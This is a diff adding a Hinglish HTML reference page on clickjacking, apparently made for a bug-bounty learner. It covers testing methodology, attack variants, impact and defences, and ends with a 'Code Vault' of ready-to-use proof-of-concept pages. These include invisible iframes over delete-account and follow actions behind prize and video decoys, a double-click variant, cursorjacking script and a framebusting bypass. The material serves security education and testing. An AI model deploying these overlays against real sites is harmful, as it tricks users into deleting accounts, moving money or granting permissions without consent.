@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<title>Clickjacking — Complete Reference</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --border:#30363d;
+    --text:#c9d1d9; --muted:#8b949e;
+    --blue:#58a6ff; --green:#3fb950; --orange:#f0883e;
+    --red:#f85149; --purple:#bc8cff; --yellow:#e3b341;
+  }
+  *{box-sizing:border-box;}
+  body{background:var(--bg); color:var(--text); font-family:'Segoe UI',Arial,sans-serif; margin:0; padding:0; line-height:1.65;}
+  header{background:linear-gradient(135deg,#1f2937,#111827); padding:45px 30px; border-bottom:3px solid var(--green); text-align:center;}
+  header h1{color:var(--green); font-size:2.2em; margin:0;}
+  header p{color:var(--muted); margin-top:8px;}
+  .container{max-width:980px; margin:0 auto; padding:30px 20px;}
+  .toc{background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:20px 25px; margin-bottom:30px;}
+  .toc h2{color:var(--yellow); margin-top:0;}
+  .toc a{color:var(--blue); text-decoration:none; display:block; padding:4px 0;}
+  .toc a:hover{text-decoration:underline;}
+  section{background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:25px 30px; margin-bottom:25px;}
+  section h2{color:var(--orange); border-bottom:2px solid var(--border); padding-bottom:10px; font-size:1.5em;}
+  section h3{color:var(--green); margin-top:25px;}
+  .badge{display:inline-block; background:var(--red); color:#fff; font-size:0.7em; padding:2px 8px; border-radius:12px; margin-left:8px; vertical-align:middle;}
+  .badge.info{background:var(--blue);} .badge.warn{background:var(--yellow); color:#000;} .badge.adv{background:var(--purple);}
+  .note{background:#1c2333; border-left:4px solid var(--blue); padding:12px 16px; margin:15px 0; border-radius:0 6px 6px 0;}
+  .warn-box{background:#2d1a1a; border-left:4px solid var(--red); padding:12px 16px; margin:15px 0; border-radius:0 6px 6px 0;}
+  pre{background:#010409; border:1px solid var(--border); border-radius:8px; padding:16px; overflow-x:auto; font-size:0.92em;}
+  code{color:var(--green); font-family:'Consolas','Courier New',monospace;}
+  .step{display:flex; gap:15px; margin:15px 0; align-items:flex-start;}
+  .step-num{background:var(--blue); color:#000; font-weight:bold; min-width:32px; height:32px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0;}
+  table{width:100%; border-collapse:collapse; margin:15px 0;}
+  th, td{border:1px solid var(--border); padding:8px 12px; text-align:left;}
+  th{background:#1c2333; color:var(--yellow);}
+  tr:nth-child(even){background:#141a24;}
+  footer{text-align:center; color:var(--muted); padding:30px; font-size:0.9em;}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>🖱️ Clickjacking — Complete Reference</h1>
+  <p>UI Redressing Attack | Detection → Exploitation PoC → Advanced Variants → Defense</p>
+</header>
+
+<div class="container">
+
+  <div class="toc">
+    <h2>📑 Index</h2>
+    <a href="#basics">1. Clickjacking Kya Hai</a>
+    <a href="#how">2. Ye Kaise Kaam Karta Hai</a>
+    <a href="#methodology">3. Step-by-Step Testing Methodology</a>
+    <a href="#variants">4. Advanced Variants</a>
+    <a href="#impact">5. Real-World Impact Scenarios</a>
+    <a href="#defense">6. Defense / Prevention</a>
+    <a href="#megacodes">7. 🔥 Code Vault — Ready-to-Use PoCs</a>
+    <a href="#checklist">8. Practice Checklist</a>
+  </div>
+
+  <section id="basics">
+    <h2>1. Clickjacking Kya Hai</h2>
+    <p>Clickjacking (UI Redressing) ek attack hai jisme attacker victim ko trick karta hai kisi element pe click karne ke liye jo unhe actually dikh nahi raha hota. Attacker target website ko ek **invisible/transparent iframe** mein load karta hai aur apne khud ke fake page ke upar exactly overlay karta hai jaha victim ka click expected hota hai.</p>
+    <div class="note">Victim ko lagta hai wo apni site pe kisi normal button (jaise "Play Video" ya "Claim Prize") pe click kar raha hai, lekin actually unka click **target site ke real, sensitive button** tak pahunch raha hota hai — bina unke consent ya knowledge ke.</div>
+  </section>
+
+  <section id="how">
+    <h2>2. Ye Kaise Kaam Karta Hai</h2>
+    <div class="step"><div class="step-num">1</div><div>Attacker apni malicious webpage banata hai jisme tempting content hota hai (game, prize, video)</div></div>
+    <div class="step"><div class="step-num">2</div><div>Target website ko iframe mein embed karta hai: <code>&lt;iframe src="https://target.com/sensitive-action"&gt;</code></div></div>
+    <div class="step"><div class="step-num">3</div><div>CSS se iframe ko invisible karta hai: <code>opacity: 0.0001</code></div></div>
+    <div class="step"><div class="step-num">4</div><div>Iframe ko exact position pe rakhta hai jaha victim ka decoy button dikh raha hota hai (z-index + absolute positioning)</div></div>
+    <div class="step"><div class="step-num">5</div><div>Victim decoy button pe click karta hai → actually invisible iframe ke andar target site ka real button click ho jata hai</div></div>
+
+    <h3>Visual Layer Concept</h3>
+    <table>
+      <tr><th>Layer</th><th>Kya hota hai</th><th>Visibility</th></tr>
+      <tr><td>Top (z-index high)</td><td>Invisible target site iframe (real button)</td><td>Invisible (opacity ~0)</td></tr>
+      <tr><td>Bottom (z-index low)</td><td>Attacker ka decoy content (fake button)</td><td>Visible</td></tr>
+    </table>
+  </section>
+
+  <section id="methodology">
+    <h2>3. Step-by-Step Testing Methodology</h2>
+
+    <div class="step"><div class="step-num">1</div><div>
+      <b>X-Frame-Options header check karo</b><br>
+      Burp Suite mein target page ka response headers dekho:
+      <pre><code>X-Frame-Options: DENY          → protected, framing blocked
+X-Frame-Options: SAMEORIGIN    → protected, sirf same-origin framing allowed
+(header missing)               → possibly vulnerable</code></pre>
+    </div></div>
+
+    <div class="step"><div class="step-num">2</div><div>
+      <b>CSP frame-ancestors check karo</b><br>
+      <pre><code>Content-Security-Policy: frame-ancestors 'none';   → protected
+Content-Security-Policy: frame-ancestors 'self';   → protected
+(CSP header missing frame-ancestors directive)     → possibly vulnerable</code></pre>
+    </div></div>
+
+    <div class="step"><div class="step-num">3</div><div>
+      <b>Simple iframe test PoC banao</b> — Section 7 se basic template lo aur target URL daalo
+    </div></div>
+
+    <div class="step"><div class="step-num">4</div><div>
+      <b>Local file save karke browser mein open karo</b> aur dekho target page load hota hai ya blocked hota hai (blank/error)
+    </div></div>
+
+    <div class="step"><div class="step-num">5</div><div>
+      <b>Agar load ho jaye</b> — sensitive action wale page pe test karo (settings change, delete account, follow/like, fund transfer)
+    </div></div>
+
+    <div class="step"><div class="step-num">6</div><div>
+      <b>Overlay/decoy design karo</b> taaki actual click position target ke button se match kare — screenshot le ke measure karo
+    </div></div>
+
+    <div class="step"><div class="step-num">7</div><div>
+      <b>Impact demonstrate karo</b> — PoC record/screenshot lo jisme dikhe ki decoy click se target action trigger hua
+    </div></div>
+  </section>
+
+  <section id="variants">
+    <h2>4. Advanced Variants <span class="badge adv">Advanced</span></h2>
+
+    <h3>Double Clickjacking</h3>
+    <p>Do clicks involve karta hai — pehla click ek benign action trigger karta hai jo page ko change kar deta hai, dusra click (jo victim expect nahi karta) sensitive action trigger karta hai. Modern browsers ke single-click protections ko bypass karne ke liye use hota hai.</p>
+
+    <h3>Cursorjacking</h3>
+    <p>CSS se custom cursor render karke actual cursor position ko visually offset kar diya jata hai — victim ko lagta hai wo kahi aur click kar raha hai jab ki real cursor kahi aur hota hai.</p>
+
+    <h3>Drag-and-Drop Clickjacking</h3>
+    <p>Click ki jagah drag-drop interaction abuse hoti hai — victim ko game/puzzle jaisa UI dikhaya jata hai, unka drag action actually target site ke form ko autofill/submit kar deta hai.</p>
+
+    <h3>Likejacking</h3>
+    <p>Social media "Like"/"Follow" buttons ko invisible overlay se click karwana — victim unknowingly content share/promote kar deta hai.</p>
+
+    <h3>Filejacking</h3>
+    <p>File upload/download dialogs ko invisible overlay ke through trigger karna, victim ke system se files access karne ke liye (browser-dependent, mostly legacy).</p>
+
+    <h3>Nested Iframe Bypass</h3>
+    <p>Kuch weak `SAMEORIGIN` implementations ko bypass karne ke liye multiple nested iframes use kiye jate hain jab framebusting script incomplete ho.</p>
+  </section>
+
+  <section id="impact">
+    <h2>5. Real-World Impact Scenarios</h2>
+    <table>
+      <tr><th>Scenario</th><th>Impact</th></tr>
+      <tr><td>Social media "Follow/Like" button clickjack</td><td>Unauthorized engagement, spam spread (Low-Medium)</td></tr>
+      <tr><td>Account settings page (email change) clickjack</td><td>Account takeover chain possible (High)</td></tr>
+      <tr><td>Banking "Confirm Transfer" clickjack</td><td>Financial loss (Critical)</td></tr>
+      <tr><td>Camera/mic permission grant clickjack</td><td>Privacy violation, surveillance (High)</td></tr>
+      <tr><td>"Delete Account" button clickjack</td><td>Data loss, denial of service to user (High)</td></tr>
+      <tr><td>2FA disable button clickjack</td><td>Auth bypass chain enabler (High)</td></tr>
+    </table>
+    <div class="note">Report likhte waqt severity ko target ke specific sensitive action ke impact se justify karo — generic "clickjacking found" likhna weak hota hai, "clickjacking on delete-account endpoint leads to account deletion without consent" strong hota hai.</div>
+  </section>
+
+  <section id="defense">
+    <h2>6. Defense / Prevention <span class="badge info">Developer Side</span></h2>
+    <div class="step"><div class="step-num">1</div><div><b>X-Frame-Options header set karo</b><br><pre><code>X-Frame-Options: DENY</code></pre></div></div>
+    <div class="step"><div class="step-num">2</div><div><b>CSP frame-ancestors use karo</b> (modern, more flexible)<br><pre><code>Content-Security-Policy: frame-ancestors 'none';</code></pre></div></div>
+    <div class="step"><div class="step-num">3</div><div><b>SameSite cookies</b> set karo taaki cross-origin requests mein session cookie na jaye</div></div>
+    <div class="step"><div class="step-num">4</div><div><b>Sensitive actions ke liye re-authentication/confirmation</b> maango (password re-enter, CAPTCHA)</div></div>
+    <div class="step"><div class="step-num">5</div><div><b>Framebusting JS</b> as fallback (legacy browsers ke liye, primary defense nahi honi chahiye)</div></div>
+  </section>
+
+  <section id="megacodes">
+    <h2>7. 🔥 Code Vault — Ready-to-Use PoCs <span class="badge adv">Advanced</span></h2>
+
+    <h3>Basic Clickjacking PoC</h3>
+    <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Clickjacking PoC&lt;/title&gt;
+&lt;style&gt;
+  body { margin:0; }
+  iframe {
+    width: 800px;
+    height: 600px;
+    position: absolute;
+    top: 100px;
+    left: 100px;
+    opacity: 0.0001;
+    z-index: 2;
+    border: none;
+  }
+  .decoy {
+    position: absolute;
+    top: 250px;
+    left: 300px;
+    z-index: 1;
+    font-size: 24px;
+    background: yellow;
+    padding: 20px;
+    border-radius: 10px;
+    cursor: pointer;
+  }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div class="decoy"&gt;🎁 Click Here to Claim Your Prize!&lt;/div&gt;
+  &lt;iframe src="https://target.com/settings/delete-account"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+    <h3>Overlay Alignment Debug Version (opacity visible for testing)</h3>
+    <pre><code>&lt;style&gt;
+  iframe {
+    width: 800px; height: 600px;
+    position: absolute; top: 100px; left: 100px;
+    opacity: 0.5;   /* debugging ke liye visible rakha, PoC final mein 0.0001 */
+    z-index: 2; border: 2px solid red;
+  }
+&lt;/style&gt;</code></pre>
+
+    <h3>Double Clickjacking PoC (two-step)</h3>
+    <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;
+  #step1, #step2 { position:absolute; top:200px; left:300px; }
+  iframe { opacity:0.0001; position:absolute; top:200px; left:300px; width:400px; height:200px; }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div id="step1" onclick="document.getElementById('step1').style.display='none'; 
+    document.getElementById('step2').style.display='block';"&gt;
+    Click to Continue (Step 1)
+  &lt;/div&gt;
+  &lt;div id="step2" style="display:none;"&gt;Click to Confirm (Step 2)&lt;/div&gt;
+  &lt;iframe src="https://target.com/sensitive-action"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+    <h3>Likejacking Style PoC (social button)</h3>
+    <pre><code>&lt;style&gt;
+  iframe {
+    width: 100px; height: 30px;
+    position: absolute; top: 400px; left: 400px;
+    opacity: 0.0001; z-index: 2;
+  }
+  .fake-button {
+    position: absolute; top: 400px; left: 400px;
+    z-index: 1; background: #4267B2; color: white;
+    padding: 8px 20px; border-radius: 5px; font-family: sans-serif;
+  }
+&lt;/style&gt;
+&lt;div class="fake-button"&gt;▶ Play Video&lt;/div&gt;
+&lt;iframe src="https://target.com/follow?user=attacker"&gt;&lt;/iframe&gt;</code></pre>
+
+    <h3>Cursorjacking Concept PoC</h3>
+    <pre><code>&lt;style&gt;
+  body { cursor: none; }
+  #fake-cursor {
+    position: absolute;
+    width: 20px; height: 20px;
+    background: url('cursor.png');
+    pointer-events: none;
+    z-index: 999;
+  }
+&lt;/style&gt;
+&lt;div id="fake-cursor"&gt;&lt;/div&gt;
+&lt;script&gt;
+  document.addEventListener('mousemove', function(e) {
+    // Real cursor se offset karke fake cursor render karo
+    document.getElementById('fake-cursor').style.left = (e.pageX - 30) + 'px';
+    document.getElementById('fake-cursor').style.top = (e.pageY - 30) + 'px';
+  });
+&lt;/script&gt;</code></pre>
+
+    <h3>Testing Headers via cURL</h3>
+    <pre><code># X-Frame-Options aur CSP check karo
+curl -I https://target.com/page
+
+# Response mein dhundo:
+# X-Frame-Options: ...
+# Content-Security-Policy: frame-ancestors ...</code></pre>
+
+    <h3>Burp Suite Extension Approach</h3>
+    <pre><code># Burp mein "Clickjacking PoC generator" extension use karo
+# Extender → BApp Store → "Clickbandit" install karo
+# Target request pe right-click → Extensions → Clickbandit → Generate PoC</code></pre>
+
+    <h3>Framebusting Bypass Attempt (jab legacy JS-based protection ho)</h3>
+    <pre><code>&lt;!-- Kuch purane framebusting scripts sandbox attribute se bypass ho sakte hain --&gt;
+&lt;iframe src="https://target.com/page" 
+        sandbox="allow-forms allow-scripts allow-same-origin"&gt;
+&lt;/iframe&gt;
+
+&lt;!-- sandbox top-navigation block kar deta hai, 
+     jisse target ki JS framebusting redirect nahi kar pati --&gt;</code></pre>
+
+    <h3>Automated Detection Script (Python)</h3>
+    <pre><code>import requests
+
+def check_clickjacking(url):
+    r = requests.get(url)
+    xfo = r.headers.get('X-Frame-Options')
+    csp = r.headers.get('Content-Security-Policy')
+    
+    print(f"URL: {url}")
+    print(f"X-Frame-Options: {xfo}")
+    print(f"CSP: {csp}")
+    
+    if not xfo and (not csp or 'frame-ancestors' not in (csp or '')):
+        print("[!] Possibly vulnerable to Clickjacking")
+    else:
+        print("[+] Protected")
+
+check_clickjacking("https://target.com")</code></pre>
+  </section>
+
+  <section id="checklist">
+    <h2>8. Practice Checklist ✅</h2>
+    <table>
+      <tr><th>Task</th><th>Status</th></tr>
+      <tr><td>X-Frame-Options header check kiya</td><td>☐</td></tr>
+      <tr><td>CSP frame-ancestors check kiya</td><td>☐</td></tr>
+      <tr><td>Basic iframe PoC banaya</td><td>☐</td></tr>
+      <tr><td>Sensitive action page identify kiya</td><td>☐</td></tr>
+      <tr><td>Overlay alignment test kiya</td><td>☐</td></tr>
+      <tr><td>Screenshot/video proof capture kiya</td><td>☐</td></tr>
+      <tr><td>Impact clearly describe kiya report mein</td><td>☐</td></tr>
+      <tr><td>Remediation (X-Frame-Options/CSP) suggest kiya</td><td>☐</td></tr>
+    </table>
+    <div class="warn-box">
+      <b>Ethics reminder:</b> PoC sirf apne authorized test environment ya scope-approved target pe host karo. Kabhi bhi real users ko is PoC link pe click karwane ki koshish mat karo — sirf apne khud ke test account se demonstrate karo.
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  Made for Karan's Bug Bounty → Red Team journey | Har cheez mein poochho — Yeh kaise toot sakta hai?
+</footer>
+
+</body>
+</html>
